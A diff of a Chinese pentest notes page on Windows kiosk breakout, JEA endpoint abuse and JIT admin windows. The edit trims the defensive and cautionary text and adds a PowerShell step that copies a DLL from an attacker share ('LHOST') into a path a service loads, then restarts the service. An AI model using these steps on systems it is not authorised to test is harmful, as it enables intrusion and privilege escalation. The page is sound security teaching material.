@@ -1,55 +1,34 @@
 # Kiosk、JEA、JIT
 
-这三件事都是「表面锁住了，深层通道还在」。
+::: warning 仅供学习 / 授权实验
+:::
 
-## Kiosk
+## Kiosk 通道（低到高）
 
-单应用桌面常常只换了外壳：开始菜单、Win+R、任务管理器被藏起来，但对话框还在。
+1. Alt+Tab / Alt+F4 / Win / Ctrl+Shift+Esc  
+2. IE 地址栏 `file:///C:/Windows/System32/cmd.exe`（现代 Chrome 只会下载）  
+3. 打开/另存为/打印 PDF：地址栏进 `C:\Windows\System32`，再回车 `cmd.exe`  
+4. 帮助 `.chm`、Win+U、屏幕键盘  
+5. 任务管理器 → 文件 → 运行新任务  
 
-按成本从低到高试（每步先想好成功信号）：
-
-1. Alt+Tab、Alt+F4、Win 键、Ctrl+Shift+Esc — 外壳是不是真的没了
-2. 浏览器地址栏 `file:///C:/Windows/System32/cmd.exe`（老 IE / WebBrowser 控件有时会「运行」；现代 Chrome/Edge 通常只下载）
-3. **打开 / 另存为 / 导入 / 打印到 PDF**：地址栏进 `C:\Windows\System32`，再对 `cmd.exe` 回车。这是最常被漏封的通道
-4. 帮助（`.chm` / 浏览器）、轻松使用（Win+U）、屏幕键盘上的 Win 键
-5. 任务管理器 → 文件 → 运行新任务
-
-突破后通常只是 kiosk 用户权限。提权走常规 [Windows 提权](/topics/windows-privesc)。把成功通道记进笔记，避免反复进出。
-
-RDP 剪贴板和盘映射若开着，投递会容易很多——这也应写进防御建议。
+突破后是 kiosk 用户。提权走 [Windows 提权](/topics/windows-privesc)。
 
 ## JEA
 
-Just Enough Administration 把 PowerShell 端点限制成白名单命令。危险来自**过宽的文件类 cmdlet**，例如允许 `Copy-Item` 写到服务可加载的路径。
+端点里列出真正允许的命令。若 `Copy-Item` 能写到服务会加载的路径：
 
-实验顺序：
+```powershell
+Copy-Item \\LHOST\share\lab.dll C:\ProgramData\App\plugin.dll
+Restart-Service AppService
+```
 
-1. 列出真正允许的命令（`Get-Command` 在该端点里往往也被裁过，按实际报错判断）
-2. 找可写、且高权进程会加载的位置（服务 DLL、计划任务脚本、配置里的路径）
-3. 复制的是你自己编译的实验模块，不是从公网拉马
-4. 触发服务重启或等待加载
-
-本站不提供「服务 DLL 载荷」。JEA 的修复是收紧允许列表：能 `Copy-Item` 不等于能写任意 ACL 允许的路径——要把目的路径也限制住。
+修复侧：限制目的路径，不要只白名单 cmdlet 名。
 
 ## JIT
-
-临时管理员有时间窗。窗口内要做的是**既定、可复现**的动作，而不是探索。
-
-窗口结束前：
-
-- 需要的配置改动是否已完成
-- 是否留下仍有效的票据 / 会话（有的环境会回收组成员，但已发 TGT 还在）
-- 不要把「过期后仍能用的票」当成稳定后门写进生产建议——报告里应标成残留风险并建议清票
 
 ```powershell
 whoami /groups
 klist
+# 窗口内只跑事先写好的命令
+klist purge   # 窗口结束后若票还在，记进报告
 ```
-
-时间不够就先固化证据和票，不要开新的不确定利用链。
-
-## 防御侧
-
-- Kiosk：文件对话框、帮助、打印、辅助功能一并锁；WDAC
-- JEA：会话类型、可见 cmdlet、参数验证、禁止写服务目录
-- JIT：短 TTL、回收组成员时同时 `klist purge` 或等票过期；审计窗口内的特权操作
